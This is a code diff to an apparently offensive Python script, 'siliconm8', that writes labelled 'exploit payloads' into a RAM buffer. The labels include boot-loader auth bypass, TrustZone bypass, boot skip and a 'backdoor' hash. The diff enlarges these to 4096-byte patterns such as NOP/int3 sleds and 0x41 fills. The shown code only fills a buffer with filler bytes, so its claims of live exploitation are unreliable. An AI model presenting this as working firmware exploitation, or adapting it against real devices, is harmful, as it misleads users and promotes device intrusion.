@@ -145,15 +145,15 @@ def execute_siliconm8_in_ram(input_path, verbose=False, fuse_random=False, entro
     ram.write(payload)
     
     exploit_payloads = [
-         (0x100, b"\xDE\xC0\xAD\xDE" * 4),                         
-         (0x200, struct.pack("<Q", 0x4141414141414141) * 8),        
-         (0x300, b"\x00" * 64),                                     # Null pointer trigger
-         (0x400, b"SBL_AUTH_BYPASS" + b"\x00" * 32),                
-         (0x500, b"GHOST_ENTROPY" + os.urandom(16)),                
-         (0x600, b"TZ_BYPASS" + os.urandom(24)),                
-         (0x700, b"\x90" * 32 + b"\xCC" * 32),                      
-         (0x800, b"\x41\x41\x41\x41" * 16),                         
-         (0x900, b"BOOT_SKIP" + b"\x00" * 40),                      
+         (0x100, b"\xDE\xC0\xAD\xDE" * 4096),                         
+         (0x200, struct.pack("<Q", 0x4141414141414141) * 4096),        
+         (0x300, b"\x00" * 4096),                                     # Null pointer trigger
+         (0x400, b"SBL_AUTH_BYPASS" + b"\x00" * 4096),                
+         (0x500, b"GHOST_ENTROPY" + os.urandom(128)),                
+         (0x600, b"TZ_BYPASS" + os.urandom(128)),                
+         (0x700, b"\x90" * 32 + b"\xCC" * 4096),                      
+         (0x800, b"\x41\x41\x41\x41" * 4096),                         
+         (0x900, b"BOOT_SKIP" + b"\x00" * 4096),                      
          (0xA00, hashlib.sha1(b"backdoor").digest()),              
      ]
 
@@ -178,7 +178,10 @@ def execute_siliconm8_in_ram(input_path, verbose=False, fuse_random=False, entro
         print(f"  Control Byte : {payload[56]}")
         print(f"\n  ▓ Trust Logs and Keychain:")
         print(payload[57:].decode(errors='ignore').strip())
-        print(f"\n[+] Injected {len(exploit_payloads)} live memory exploit payloads.")
+        print(f"\n[+] Injected {len(exploit_payloads)} live memory exploit payloads:")
+        for offset, data in exploit_payloads:
+               print(f"    - Offset 0x{offset:04X} | {len(data)} bytes")
+
     time.sleep(timeout)
     ram.close()
     print("\n[✓] Execution completed safely. RAM unmapped. Exiting...")
@@ -263,5 +266,5 @@ if __name__ == "__main__":
         debug_spoof=debug_spoof,
         attack_level=attack_level,
         timeout=timeout
-        )
+    )
     
